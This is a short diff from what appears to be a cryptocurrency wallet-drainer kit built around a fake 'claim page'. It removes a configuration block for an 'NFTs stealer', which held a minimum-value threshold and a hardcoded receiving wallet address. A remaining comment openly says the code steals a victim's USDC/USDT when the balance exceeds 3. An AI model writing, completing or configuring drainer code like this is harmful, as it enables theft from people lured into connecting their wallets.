@@ -57,11 +57,7 @@ const claimPageInfo = {
   imageRadius: 250, // image radius in px
 };
 
-const drainNftsInfo = {
-  active: true, // Active (true) or not (false) NFTs stealer.
-  minValue: 0.5, // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
-  nftReceiveAddress: "0xE6ACa0ebf3D62ffF4CC076eA47873ab1464364B9", // leave empty if you want to use the same as receiveAddress
-};
+
 
 // the "3" you see in all the addresses are the min value, if the victim has less than 3 USDC/T then it will not steal it. If it has over 3 USD it will steal it.
 const erc20list = {
